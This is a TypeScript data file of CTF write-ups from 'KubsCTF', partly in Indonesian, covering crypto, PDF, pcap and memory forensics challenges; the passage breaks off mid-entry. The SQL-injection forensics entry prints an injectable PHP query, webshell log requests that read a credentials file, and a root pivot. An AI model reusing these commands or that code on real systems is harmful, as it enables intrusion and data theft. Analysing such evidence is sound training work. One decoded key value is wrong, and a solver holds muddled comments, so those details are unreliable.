import type { WriteUp } from '../types';

// KubsCTF — 30 writeups
export const kubsctfWriteups: WriteUp[] = [
  {
    "id": "kubsuctf-crypto-nintendo",
    "title": "Nintendo 3DS - Crypto Challenge",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "KubsCTF",
    "tags": [],
    "description": "Writeup for challenge Nintendo 3DS - Crypto Challenge",
    "problemDescription": "",
    "tools": [],
    "analysis": "The file `output.txt` contained the following information:\n- `CBC+PKCS5`: Indicates the mode (CBC) and padding (PKCS5).\n- `1 = TjFudDNuZG8=` (Base64)\n- `2 = 83 51 99 117 114 49 116 121` (Decimal ASCII)\n- `3 = 4b33792132303236` (Hex)\n- `ivx = 0a001f0273760054`\n- `ivm = M4r10Br0`\n- A long hex string (the ciphertext).",
    "solution": [
      {
        "title": "Challenge Description",
        "content": "The challenge title \"Nintendo 3DS\" and the hint \"something very similar to Nintendo 3DS\" strongly suggest the **3DES (Triple DES)** encryption algorithm."
      },
      {
        "title": "Key Reconstruction",
        "content": "The 3DES key consists of three parts (K1, K2, K3), each 8 bytes long.\n1. `K1 = base64_decode(\"TjFudDNuZG8=\") = \"NiNt3ndo\"`\n2. `K2 = bytes([83, 51, 99, 117, 114, 49, 116, 121]) = \"S3cur1ty\"`\n3. `K3 = bytes.fromhex(\"4b33792132303236\") = \"K3y!2026\"`\n**Full Key:** `NiNt3ndoS3cur1tyK3y!2026`"
      },
      {
        "title": "IV Reconstruction",
        "content": "The IV was derived from `ivx` and `ivm`:\n- `ivx = 0a001f0273760054` (Hex)\n- `ivm = \"M4r10Br0\"`\n- `IV = ivx XOR ivm = \"G4m3C4rd\"`"
      },
      {
        "title": "Solution Script",
        "content": "The following Python script was used to decrypt the ciphertext:",
        "code": "from Crypto.Cipher import DES3\nfrom Crypto.Util.Padding import unpad\nimport base64\n\nk1 = base64.b64decode(\"TjFudDNuZG8=\")\nk2 = bytes([83, 51, 99, 117, 114, 49, 116, 121])\nk3 = bytes.fromhex(\"4b33792132303236\")\nkey = k1 + k2 + k3\n\nivx = bytes.fromhex(\"0a001f0273760054\")\nivm = b\"M4r10Br0\"\niv = bytes([a ^ b for a, b in zip(ivx, ivm)])\n\nciphertext_hex = \"072a8e75459a545679f3aa56a9fafb38871022de0c9bd5d7ef55e8dad7861662eb0fb630d9cdf9dd8c64a3a8ac28b86a\"\nciphertext = bytes.fromhex(ciphertext_hex)\n\ncipher = DES3.new(key, DES3.MODE_CBC, iv)\ndecrypted = cipher.decrypt(ciphertext)\nplaintext = unpad(decrypted, 8)\nprint(f\"Decrypted: {plaintext.decode()}\")"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "from Crypto.Cipher import DES3\r\nfrom Crypto.Util.Padding import unpad\r\nimport base64\r\n\r\n# Key components\r\nk1 = base64.b64decode(\"TjFudDNuZG8=\")\r\nk2 = bytes([83, 51, 99, 117, 114, 49, 116, 121])\r\nk3 = bytes.fromhex(\"4b33792132303236\")\r\nkey = k1 + k2 + k3\r\n\r\n# IV components\r\nivx = bytes.fromhex(\"0a001f0273760054\")\r\nivm = b\"M4r10Br0\"\r\niv = bytes([a ^ b for a, b in zip(ivx, ivm)])\r\n\r\n# Ciphertext\r\nciphertext_hex = \"072a8e75459a545679f3aa56a9fafb38871022de0c9bd5d7ef55e8dad7861662eb0fb630d9cdf9dd8c64a3a8ac28b86a\"\r\nciphertext = bytes.fromhex(ciphertext_hex)\r\n\r\n# Decryption\r\ncipher = DES3.new(key, DES3.MODE_CBC, iv)\r\ntry:\r\n    decrypted = cipher.decrypt(ciphertext)\r\n    plaintext = unpad(decrypted, 8)\r\n    print(f\"Decrypted: {plaintext.decode()}\")\r\nexcept Exception as e:\r\n    print(f\"Error: {e}\")\r\n    print(f\"Decrypted (raw): {decrypted.hex()}\")"
      }
    ],
    "terminalOutputs": [],
    "flag": "KubSTU{3d3s_n1nt3nd0_cbc_m0d3_n07_h4rd_3n0ugh}",
    "lessonsLearned": ""
  },
  {
    "id": "kubsuctf-foren-demo",
    "title": "Challenge Demo",
    "category": "Foren",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "KubsCTF",
    "tags": [],
    "description": "Challenge ini memberikan snapshot dua host:",
    "problemDescription": "Challenge ini memberikan snapshot dua host:\n\n- `service/` mewakili web server\n- `DB/` mewakili database server\n\nTarget analisisnya adalah menjawab empat hal:\n\n1. Vulnerability apa yang dipakai untuk initial access\n2. File apa yang di-upload\n3. Attacker kemudian beroperasi sebagai user apa\n4. File apa yang dicopy",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "1. Recon awal",
        "content": "Pertama saya enumerasi isi artefak dan menemukan file penting berikut:\n\n- `service/var/log/apache2/access.log`\n- `service/var/log/apache2/error.log`\n- `service/var/www/html/index.php`\n- `service/var/www/html/config.php`\n- `service/home/www-data/.bash_history`\n- `service/home/www-data/.ssh_key_key`\n- `DB/var/log/auth.log`\n- `DB/home/dbadmin/.bash_history`\n- `DB/home/dbadmin/.ssh_authorized_keys`\n\nIni langsung menunjukkan bahwa challenge ini bisa diselesaikan murni dari korelasi source code, web log, SSH artifact, dan shell history."
      },
      {
        "title": "2. Menentukan initial access",
        "content": "File `service/var/www/html/index.php` berisi query SQL yang memakai parameter `id` tanpa sanitasi:\n\n\n\nItu adalah SQL Injection yang jelas.\n\nLog akses Apache memberi bukti eksploitasi yang sangat eksplisit:\n\n\n\nDari request ini terlihat attacker memakai:\n\n- `UNION SELECT`\n- `INTO OUTFILE`\n- payload PHP\n\nArtinya initial access diperoleh melalui **SQL Injection** pada `index.php`.",
        "code": "$id = $_GET['id'];\n$sql = \"SELECT title, content FROM articles WHERE id = $id\";"
      },
      {
        "title": "3. Menentukan file yang di-upload",
        "content": "Request tadi juga sekaligus menunjukkan file yang ditulis ke server:\n\n- `/var/www/html/uploads/shell.php`\n\nNama filenya adalah `shell.php`.\n\nLog berikut mengonfirmasi file itu langsung dipanggil sebagai webshell:\n\n\n\nJadi file yang di-upload adalah **`shell.php`**.",
        "code": "192.168.1.100 - - [26/Mar/2026:10:16:15 +0300] \"GET /uploads/shell.php?cmd=id HTTP/1.1\" 200 30\n192.168.1.100 - - [26/Mar/2026:10:16:20 +0300] \"GET /uploads/shell.php?cmd=ls%20-la%20/home/www-data HTTP/1.1\" 200 200\n192.168.1.100 - - [26/Mar/2026:10:16:25 +0300] \"GET /uploads/shell.php?cmd=cat%20/var/www/html/config.php HTTP/1.1\" 200 500"
      },
      {
        "title": "4. Pivot dari web server ke DB server",
        "content": "Attacker lalu membaca `config.php` lewat webshell. Di file itu ada kredensial sensitif:\n\n- `SSH_HOST = 192.168.1.50`\n- `SSH_USER = dbadmin`\n- `SSH_KEY = /home/www-data/.ssh_key_key`\n\nDi host web server memang ada private key:\n\n- `service/home/www-data/.ssh_key_key`\n\nDi host DB ada authorized key milik `dbadmin`:\n\n- `DB/home/dbadmin/.ssh_authorized_keys`\n\nKeduanya cocok. Fingerprint private key dan public key sama.\n\nLalu `DB/var/log/auth.log` memberi bukti login SSH:\n\n\n\nJadi attacker kemudian beroperasi sebagai **`dbadmin`** pada DB server, lalu memakai `sudo` untuk naik ke root.",
        "code": "Mar 26 10:16:30 victim-db sshd[5680]: Accepted publickey for dbadmin from 192.168.1.10 port 54323 ssh-rsa SHA256:hK6cLRP4m5w60fHK1BGmWooBTXIWz+vtVHmuH/luoVQ\nMar 26 10:16:31 victim-db sshd[5681]: pam_unix(sshd:session): session opened for user dbadmin by (uid=0)\nMar 26 10:16:35 victim-db sudo: dbadmin : TTY=pts/0 ; PWD=/home/dbadmin ; USER=root ; COMMAND=/bin/bash"
      },
      {
        "title": "5. Menentukan file yang dicopy",
        "content": "File `DB/home/dbadmin/.bash_history` adalah bukti paling langsung:\n\n\n\nFile yang dicopy adalah:\n\n- **`confidential_data.sql`**\n\nNama path sumber lengkapnya:\n\n- `/var/lib/mysql/confidential_data.sql`",
        "code": "cp /var/lib/mysql/confidential_data.sql /tmp/.backup_data\nls -la /tmp/\ncat /tmp/.backup_data\nrm /tmp/.backup_data"
      },
      {
        "title": "6. Kesimpulan",
        "content": "Empat komponen flag adalah:\n\n- Vulnerability: `SQLi`\n- Uploaded file: `shell.php`\n- User yang kemudian dipakai: `dbadmin`\n- File yang dicopy: `confidential_data.sql`\n\nSehingga flag finalnya adalah:",
        "code": "KubSTU{SQLi,shell.php,dbadmin,confidential_data.sql}"
      }
    ],
    "terminalOutputs": [],
    "flag": "",
    "lessonsLearned": ""
  },
  {
    "id": "kubsuctf-foren-isthereportinenglish",
    "title": "- Is the report in English?",
    "category": "Foren",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "KubsCTF",
    "tags": [],
    "description": "Challenge ini memberi satu file PDF bernama `KUBSTU_Financial_Report_2025.pdf`. Kesan awalnya sederhana: ada laporan keuangan berbahasa Inggris, ada attachment ZIP, dan bahkan password ZIP juga ditampilkan terang-terangan di isi PDF. Karena itu justru patut curiga bahwa jalur tersebut hanya umpan.",
    "problemDescription": "Challenge ini memberi satu file PDF bernama `KUBSTU_Financial_Report_2025.pdf`. Kesan awalnya sederhana: ada laporan keuangan berbahasa Inggris, ada attachment ZIP, dan bahkan password ZIP juga ditampilkan terang-terangan di isi PDF. Karena itu justru patut curiga bahwa jalur tersebut hanya umpan.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "1. Recon awal",
        "content": "Langkah pertama adalah identifikasi file dan triage cepat:\n\n\n\nHasil penting dari tahap ini:\n\n- File memang PDF 2 halaman.\n- Ada warning `Invalid xref table`, jadi struktur PDF tidak sepenuhnya normal.\n- `strings` langsung menampilkan banyak sekali flag palsu.\n- Ada object `/EmbeddedFile`, artinya PDF memang menyimpan file terlampir.",
        "code": "file KUBSTU_Financial_Report_2025.pdf\nexiftool KUBSTU_Financial_Report_2025.pdf\npdfinfo KUBSTU_Financial_Report_2025.pdf\nstrings -a KUBSTU_Financial_Report_2025.pdf | rg \"KubSTU\\\\{|Embedded|Filespec|stream\""
      },
      {
        "title": "2. Mengecek attachment PDF",
        "content": "Dari object stream terlihat ada data ZIP yang tertanam di PDF. `binwalk` juga mengonfirmasi adanya archive pada offset tertentu.\n\n\n\nDari teks PDF yang terbaca, diketahui:\n\n- nama archive: `KUBGTU_FINANCIAL_DATA_2025.ZIP`\n- password: `FinanceKubSTU2025!`\n\nZIP kemudian diekstrak:\n\n\n\nIsi file hasil ekstraksi memang mengandung string berbentuk flag, tetapi jelas merupakan jebakan:\n\n- isi file menyebut akses tidak sah\n- formatnya terlalu teatrikal\n- ada mismatch ukuran internal\n- flag yang muncul bertema `F4k3_Fl4g...`\n\nJadi attachment bukan sumber flag asli.",
        "code": "binwalk KUBSTU_Financial_Report_2025.pdf\npdftotext KUBSTU_Financial_Report_2025.pdf -"
      },
      {
        "title": "3. Menemukan lokasi payload sebenarnya",
        "content": "Karena `xref` rusak, struktur mentah PDF perlu diperiksa. Setelah dilihat lebih teliti, object PDF normal berakhir cukup awal, tetapi area `trailer` berisi metadata yang sangat panjang dan tidak wajar.\n\n`qpdf --qdf --object-streams=disable` membantu menunjukkan bahwa trailer memiliki field metadata tambahan:\n\n- `/ArchivePassword`\n- `/HiddenAuditData`\n\nField `/HiddenAuditData (...)` ternyata berisi literal string PDF sangat besar, panjangnya sekitar 77 KB, penuh noise seperti:\n\n- `B64_...`\n- `ENC_...`\n- `KEY_...`\n- `FLAG: KubSTU{TEST_...}`\n- `SECRET='KubSTU{DUMMY_...}'`\n- berbagai baris palsu lain\n\nIni menjelaskan kenapa `strings` menghasilkan banyak flag decoy."
      },
      {
        "title": "4. Memilah noise dan menemukan outlier",
        "content": "Alih-alih decode semua token satu per satu, cara yang lebih efektif adalah mencari baris yang formatnya berbeda dari mayoritas filler. Di antara ratusan baris metadata palsu, ada satu baris yang sangat menonjol:\n\n\n\nBerbeda dari token lain, nilai ini tampak seperti Base64 utuh dan rapi. Setelah didecode:\n\n\n\nHasilnya:",
        "code": "DATA[9376]=\"S3ViU1RVe1BERl9NM3Q0ZDR0NF9GMHIzbnMxY3NfNGR2NG5jM2RfQ2g0bGwzbmczXzIwMjVfUzNjdXIzX0VtYjNkZDNkX0YxbDNfM25jcnlwdDEwbl9QcjB0MGMwbH0=\""
      },
      {
        "title": "5. Inti challenge",
        "content": "Trik challenge ini ada pada tiga lapis distraksi:\n\n1. PDF terlihat normal dan berbahasa Inggris.\n2. Ada embedded ZIP dengan password valid, tetapi isinya flag palsu.\n3. Metadata PDF menyimpan blob besar `HiddenAuditData` yang dipenuhi ratusan decoy flag.\n\nFlag asli justru berada di metadata trailer, dalam satu baris Base64 yang sengaja disamarkan di antara noise."
      }
    ],
    "terminalOutputs": [],
    "flag": "KubSTU{PDF_M3t4d4t4_F0r3ns1cs_4dv4nc3d_Ch4ll3ng3_2025_S3cur3_Emb3dd3d_F1l3_3ncrypt10n_Pr0t0c0l}",
    "lessonsLearned": ""
  },
  {
    "id": "kubsuctf-foren-mutant",
    "title": "Challenge: Mutant",
    "category": "Foren",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "KubsCTF",
    "tags": [],
    "description": "Writeup for challenge Challenge: Mutant",
    "problemDescription": "",
    "tools": [],
    "analysis": "1.  **Identifikasi Awal**:\n    File `crypt.pdf` adalah dokumen PDF standar. Saat dibuka dengan PDF reader biasa atau dikonversi ke teks menggunakan `pdftotext`, dokumen tersebut menampilkan teks sejarah singkat kriptografi. Namun, `pdftotext` mengeluarkan peringatan: `Syntax Error: Unknown compression method in flate stream`.\n\n2.  **Pemeriksaan Struktur PDF**:\n    Menggunakan perintah `strings` dan inspeksi manual terhadap objek-objek PDF, ditemukan bahwa objek ke-5 (`5 0 obj`) memiliki stream konten yang mencurigakan. Stream ini dideklarasikan menggunakan filter `/FlateDecode`, namun datanya diawali dengan `<~` dan diakhiri dengan `~>`, yang merupakan penanda untuk encoding **ASCII85**.\n\n3.  **Ekstraksi Data Tersembunyi**:\n    Kesalahan (atau \"mutasi\") pada filter PDF ini (menggunakan ASCII85 di dalam stream yang seharusnya raw zlib) menyebabkan data tersebut tidak terbaca oleh PDF reader standar. Dengan mengekstrak data di antara `<~` dan `~>`, men-decode-nya dari ASCII85, dan kemudian men-dekompresi hasilnya menggunakan `zlib`, kita mendapatkan isi stream yang sebenarnya.\n\n4.  **Menemukan Flag**:\n    Hasil dekompresi berisi banyak perintah operator teks PDF (`BT`, `Tm`, `Tj`, `ET`). Di dalamnya terdapat beberapa string yang terlihat seperti flag:\n    *   `KubSTU{pdf_0bj3ct_m4st3r_v2}` (pada koordinat y=100)\n    *   `FAKE{this_is_not_the_flag_try_harder}` (pada koordinat y=300)\n    *   `CTF{you_are_close_but_not_yet}` (pada koordinat y=450)\n\n    Sesuai dengan konteks challenge yang menyebutkan \"polytechnic university\" (KubSTU / КубГТУ), flag yang benar adalah yang memiliki prefix `KubSTU`.",
    "solution": [
      {
        "title": "Deskripsi",
        "content": "Challenge ini memberikan sebuah file PDF bernama `crypt.pdf`. Deskripsi challenge menyebutkan tentang materi perkuliahan keamanan informasi di universitas politeknik (KubSTU)."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "import re\r\nimport zlib\r\nimport base64\r\n\r\ndef solve():\r\n    with open('crypt.pdf', 'rb') as f:\r\n        content = f.read()\r\n    \r\n    # Find Object 5 which contains the hidden stream\r\n    # It is encoded with ASCII85 and then Flate compressed\r\n    start_marker = b'<~'\r\n    end_marker = b'~>'\r\n    \r\n    start = content.find(start_marker) + 2\r\n    end = content.find(end_marker, start)\r\n    \r\n    if start == 1 or end == -1:\r\n        print(\"Could not find the hidden stream.\")\r\n        return\r\n    \r\n    encoded_data = content[start:end]\r\n    \r\n    # Decode ASCII85\r\n    compressed_data = base64.a85decode(encoded_data)\r\n    \r\n    # Decompress Flate (zlib)\r\n    try:\r\n        decompressed = zlib.decompress(compressed_data).decode('utf-8', errors='ignore')\r\n    except Exception as e:\r\n        print(f\"Error decompressing: {e}\")\r\n        return\r\n    \r\n    # Extract characters from the stream\r\n    # The flag is formed by characters at y=100\r\n    matches = re.findall(r'BT 1 0 0 1 (\\d+) 100 Tm \\((.*?)\\) Tj ET', decompressed)\r\n    \r\n    # Sort by x coordinate\r\n    matches.sort(key=lambda x: int(x[0]))\r\n    \r\n    flag = \"\".join([m[1] for m in matches])\r\n    print(f\"Found flag: {flag}\")\r\n\r\nif __name__ == \"__main__\":\r\n    solve()"
      }
    ],
    "terminalOutputs": [],
    "flag": "KubSTU{pdf_0bj3ct_m4st3r_v2}",
    "lessonsLearned": ""
  },
  {
    "id": "kubsuctf-foren-ratte",
    "title": "- Ratte (Forensics)",
    "category": "Foren",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "KubsCTF",
    "tags": [],
    "description": "Writeup for challenge - Ratte (Forensics)",
    "problemDescription": "",
    "tools": [],
    "analysis": "Upon analyzing the `Ratte.pcap` file, several anomalies were found:\n1. The protocol hierarchy showed a mix of HTTP, FTP, SSH, and DNS traffic, but most of it appeared to be background noise with very small packets and no complete handshakes.\n2. A specific TCP session on port **1337** stood out. It consisted of 21 packets, all having the same sequence number (`Seq=1`). Wireshark/tshark flagged these as \"TCP Retransmissions,\" but they contained different payloads.\n3. The first packet on port 1337 had the payload `deadbeef42`. This acted as a \"beacon\" or key.\n4. Subsequent packets started with `0xCC` and had 4 or 3 additional bytes of data.",
    "solution": [
      {
        "title": "Challenge Description",
        "content": "You are an incident response specialist. Your company received a network traffic dump (pcap file) intercepted from one of the corporate network segments during suspicious activity. Analyze what's wrong here."
      },
      {
        "title": "Exploitation / Decoding",
        "content": "By analyzing the payloads of the port 1337 packets, it was discovered that the flag was hidden in the bytes at indices 3 and 4 of each packet, XORed with the last byte of the first beacon packet (`0x42`)."
      },
      {
        "title": "Decoding Table:",
        "content": "- P1: `deadbeef42` (Key byte: `0x42`)\n- P2: `cc 53 02 09 37` -> `0x09^0x42=K`, `0x37^0x42=u`\n- P3: `cc b9 02 20 11` -> `0x20^0x42=b`, `0x11^0x42=S`\n- P4: `cc 75 02 16 17` -> `0x16^0x42=T`, `0x17^0x42=U`\n- P5: `cc cb 02 39 2c` -> `0x39^0x42={`, `0x2c^0x42=n`\n- ...\n- P21: `cc 1e 01 3f` -> `0x3f^0x42=}`\n\nThe complete flag is constructed by concatenating these XORed characters."
      },
      {
        "title": "Solve Script",
        "content": "",
        "code": "key_byte = 0x42\npackets = [\n    'cc53020937', 'ccb9022011', 'cc75021617', 'cccb02392c', 'ccb102721d',\n    'cc61022f72', 'cc8e023071', 'cc00021d25', 'ccc8023071', 'cc40023232',\n    'cc6502732c', 'cc3b02251d', 'ccda02732c', 'cc2a021d36', 'cc45022a71',\n    'cc21021d26', 'cc45027630', 'cc2602291d', 'cc3f023470', 'cc1e013f'\n]\ndata = []\nfor p in packets:\n    b = bytes.fromhex(p)\n    data.extend(b[3:])\nflag = \"\".join(chr(x ^ key_byte) for x in data)\nprint(flag)"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "key = bytes.fromhex(\"deadbeef42\")\r\npackets = [\r\n    \"cc53020937\", # P2\r\n    \"ccb9022011\", # P3\r\n    \"cc75021617\", # P4\r\n    \"cccb02392c\", # P5\r\n    \"ccb102721d\", # P6\r\n    \"cc61022f72\", # P7\r\n    \"cc8e023071\", # P8\r\n    \"cc00021d25\", # P9\r\n    \"ccc8023071\", # P10\r\n    \"cc40023232\", # P11\r\n    \"cc6502732c\", # P12\r\n    \"cc3b02251d\", # P13\r\n    \"ccda02732c\", # P14\r\n    \"cc2a021d36\", # P15\r\n    \"cc45022a71\", # P16\r\n    \"cc21021d26\", # P17\r\n    \"cc45027630\", # P18\r\n    \"cc2602291d\", # P19\r\n    \"cc3f023470\", # P20\r\n    \"cc1e013f\"    # P21\r\n]\r\n\r\ndata = []\r\nfor p_hex in packets:\r\n    p = bytes.fromhex(p_hex)\r\n    data.extend(p[3:])\r\n\r\n# The user mentioned P2[4]^Key[4]='u', P3[3]^Key[4]='b', P5[3]^Key[4]='{'\r\n# This implies Key[4] (0x42) is a common XOR key.\r\n# We also noticed that XORing with 0x62 (0x42 ^ 0x20) changes case.\r\n\r\nflag = \"\"\r\nfor b in data:\r\n    res = b ^ 0x42\r\n    # Heuristic: if it's an uppercase letter that should probably be lowercase, flip it.\r\n    if ord('A') <= res <= ord('Z'):\r\n        # For 'KubSTU', we know the first few should be 'kubsu'\r\n        # 'K' -> 'k' (0x4b ^ 0x20 = 0x6b)\r\n        # 'S' -> 's' (0x53 ^ 0x20 = 0x73)\r\n        # 'T' -> 'u'? (0x54 ^ 0x21 = 0x75) - Wait, this is not a simple case flip.\r\n        pass\r\n    flag += chr(res)\r\n\r\nprint(flag)"
      }
    ],
    "terminalOutputs": [],
    "flag": "KubSTU{n0_m0r3_gr3pp1ng_1n_th3_d4rk_v2}",
    "lessonsLearned": ""
  },
  {
    "id": "kubsuctf-foren-tunnel",
    "title": "Tunnel?",
    "category": "Foren",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "KubsCTF",
    "tags": [],
    "description": "Challenge ini ternyata menyamarkan data eksfiltrasi di tengah traffic yang kelihatannya ramai dan acak. Dari awal, artefaknya cuma satu file, `Krasnodar.pcap`, jadi fokus analisis langsung ke network forensics.",
    "problemDescription": "Challenge ini ternyata menyamarkan data eksfiltrasi di tengah traffic yang kelihatannya ramai dan acak. Dari awal, artefaknya cuma satu file, `Krasnodar.pcap`, jadi fokus analisis langsung ke network forensics.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Langkah 1: Recon awal",
        "content": "Pertama saya cek file yang diberikan:\n\n\n\nHasilnya menunjukkan ini file PCAP biasa. Setelah itu saya lihat gambaran umum protokol dengan `tshark`. Capture berisi banyak trafik TCP, UDP, dan ICMP satu arah dari beberapa host internal ke beberapa IP publik. Payload mayoritas terlihat seperti noise dan memang banyak paket ICMP berisi string literal `Noise data`.\n\nIni tanda kuat kalau challenge sengaja dipenuhi trafik umpan supaya analisis tidak berhenti di protokol umum seperti HTTP atau ICMP.",
        "code": "file Krasnodar.pcap"
      },
      {
        "title": "Langkah 2: Mencari kanal eksfiltrasi yang masuk akal",
        "content": "Saat memeriksa protokol yang terurai oleh `tshark`, ada satu hal yang menonjol: terdapat 540 paket DNS dari `192.168.1.50` ke `8.8.4.4`.\n\nSaya dump nama query DNS:\n\n\n\nDari sini terlihat pola seperti:\n\n\n\nSubdomain `exfiltrate.kubstu-ctf.ru` sudah sangat mencurigakan. Sebagian besar query awal hanyalah label acak 8 dan 12 karakter, tetapi di sela-selanya muncul marker yang jauh lebih terstruktur:",
        "code": "tshark -r Krasnodar.pcap -Y \"dns\" -T fields -e frame.number -e dns.qry.name"
      },
      {
        "title": "Langkah 3: Menyadari data sebenarnya dikirim sebagai hex",
        "content": "Bagian setelah `vNN.` selalu 4 karakter heksadesimal. Itu berarti setiap marker menyimpan 2 byte data.\n\nSaya gabungkan semua nilai hex itu berurutan:\n\n\n\nKalau diubah dari hex ke ASCII, hasilnya:\n\n\n\nJadi flag memang tidak disimpan di payload TCP/UDP utama, tetapi ditanam di query DNS sebagai potongan hex kecil yang disisipkan di antara query-query acak.",
        "code": "4b75 6253 5455 7b64 306e 745f 7472 7535 745f 7468\n335f 646e 355f 7175 3372 3133 355f 7631 615f 6833 787d"
      },
      {
        "title": "Kenapa ini menarik",
        "content": "Triknya ada pada distraksi. Banyak payload lain terlihat seperti data acak dan sempat memberi kesan bahwa data mungkin dienkode base36 atau disebarkan ke banyak protokol. Tetapi kanal eksfiltrasi yang benar justru jauh lebih sederhana: query DNS dengan subdomain terstruktur.\n\nArtinya, pelajaran utamanya adalah jangan hanya terpaku pada payload besar. Kadang data penting dikirim lewat metadata kecil yang tampak sepele, seperti nama domain."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\n\r\nimport re\r\nimport subprocess\r\n\r\n\r\nPCAP = \"Krasnodar.pcap\"\r\n\r\n\r\ndef main() -> None:\r\n    output = subprocess.check_output(\r\n        [\"tshark\", \"-r\", PCAP, \"-Y\", \"dns\", \"-T\", \"fields\", \"-e\", \"dns.qry.name\"],\r\n        text=True,\r\n    )\r\n    parts = []\r\n    for name in output.splitlines():\r\n        if \".exfiltrate.kubstu-ctf.ru\" not in name:\r\n            continue\r\n        prefix = name.split(\".exfiltrate.kubstu-ctf.ru\", 1)[0]\r\n        match = re.fullmatch(r\"v\\d{2}\\.([0-9a-f]{4})\", prefix)\r\n        if match:\r\n            parts.append(bytes.fromhex(match.group(1)).decode())\r\n    flag = \"\".join(parts)\r\n    print(flag)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "KubSTU{d0nt_tru5t_th3_dn5_qu3r135_v1a_h3x}",
    "lessonsLearned": ""
  },
  {
    "id": "kubsuctf-foren-vanillaraw",
    "title": "CTF — Vanilla raw",
    "category": "Foren",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "KubsCTF",
    "tags": [],
    "description": "**Event:** KubSU CTF  \n**Category:** Forensic  \n**Difficulty:** Unknown  \n**Flag:** `KubSTU{m3m0ry_unl1nk3d_tmpfs_f0r3ns1cs}`",
    "problemDescription": "| # | Finding | Detail |\n|---|---|---|\n| 1 | **Fake/Minimal Memory Dump** | `memory.raw` berukuran 2 GB tetapi hampir seluruhnya berisi byte nol |\n| 2 | **Single Hidden Payload** | Hanya ada satu region non-zero sepanjang 2204 byte di offset `0x3df027ed` |\n| 3 | **Byte Layout Obfuscation** | Payload tidak bisa diparse langsung karena flag disembunyikan lewat transposisi byte dengan lebar 4 |\n\n---",
    "tools": [
      "file",
      "xxd",
      "strings",
      "Python — scanning region non-zero dan transposisi byte"
    ],
    "analysis": "",
    "solution": [
      {
        "title": "Challenge Description",
        "content": "> We received a RAM dump, but for some reason we can't analyze it. Help us out.\n\n---"
      },
      {
        "title": "Step 1 — Identify the File",
        "content": "Artefak yang diberikan hanya satu file:\n\n\n\nHasilnya tidak memberi informasi berarti:\n\n\n\nUkuran file juga terlihat seperti dump RAM:\n\n\n\n\n\nSekilas ini tampak seperti memory dump mentah, tetapi signature format normal tidak ada.",
        "code": "file memory.raw"
      },
      {
        "title": "Step 2 — Check for Obvious Data",
        "content": "Pengecekan awal dengan `xxd`, `strings`, dan sampling di beberapa offset menunjukkan sesuatu yang aneh: hampir seluruh isi file adalah byte nol.\n\nContoh:\n\n\n\n\n\n`exiftool` juga memberi petunjuk penting:\n\n\n\nIni menandakan file bukan dump RAM biasa yang kaya artefak, melainkan carrier yang hampir kosong.",
        "code": "xxd -l 64 memory.raw"
      },
      {
        "title": "Step 3 — Locate the Only Non-Zero Region",
        "content": "Karena file 2 GB ini hampir seluruhnya nol, pendekatan terbaik adalah mencari region non-zero.\n\nSetelah discan, ternyata hanya ada satu blok data yang benar-benar berisi:\n\n- start: `0x3df027ed`\n- end: `0x3df03088`\n- size: `2204` byte\n\nRegion itu lalu diekstrak menjadi `blob.bin`.\n\n---"
      },
      {
        "title": "Step 4 — Inspect the Extracted Blob",
        "content": "Blob hasil ekstraksi tampak seperti data acak:\n\n\n\n\n\nTetapi hasil ini menyesatkan. Parser umum seperti `gpg`, `openssl`, `binwalk`, dan `foremost` tidak bisa mengekstrak apa pun yang valid dari blob tersebut.\n\nIni berarti kemungkinan besar kita tidak berhadapan dengan file terenkripsi yang utuh, melainkan data yang harus dibaca ulang dengan susunan byte berbeda.",
        "code": "file blob.bin"
      },
      {
        "title": "Step 5 — Try Alternative Byte Layouts",
        "content": "Karena ukuran blob kecil dan tidak punya plaintext langsung, langkah berikutnya adalah mencoba menata ulang byte-nya.\n\nStrategi yang berhasil adalah:\n\n1. anggap `blob.bin` sebagai matriks byte\n2. gunakan lebar 4 byte per baris\n3. baca ulang data per kolom, bukan per baris\n\nDengan kata lain, data ditransposisikan.\n\nScript pendek untuk mengujinya:\n\n\n\nSaat hasil `col` diperiksa, flag muncul jelas di dalam output:\n\n\n\n---",
        "code": "from pathlib import Path\n\nb = Path(\"blob.bin\").read_bytes()\nw = 4\nh = len(b) // w\nrows = [b[i*w:(i+1)*w] for i in range(h)]\ncol = bytes(rows[r][c] for c in range(w) for r in range(h))\nprint(col)"
      },
      {
        "title": "Remediation",
        "content": "1. **Jangan mengandalkan obfuscation sederhana** — transposisi byte hanya menyulitkan analisis dangkal, bukan proteksi nyata\n2. **Gunakan format dump yang jelas** — memory image seharusnya memiliki struktur atau metadata acquisition yang konsisten\n3. **Lakukan validasi artefak sebelum distribusi** — file yang tampak seperti RAM dump tetapi hampir seluruhnya nol harus segera dicurigai sebagai carrier tersembunyi\n\n---"
      },
      {
        "title": "Attack Flow",
        "content": "",
        "code": "Inspect memory.raw\n      |\n      v\nDiscover file is almost entirely zero\n      |\n      v\nScan for non-zero region\n      |\n      v\nExtract 2204-byte blob from 0x3df027ed\n      |\n      v\nTry alternate interpretations of blob\n      |\n      v\nTranspose bytes using width = 4\n      |\n      v\nFlag appears in reconstructed output\n      |\n      v\nKubSTU{m3m0ry_unl1nk3d_tmpfs_f0r3ns1cs}"
      },
      {
        "title": "Solver Script",
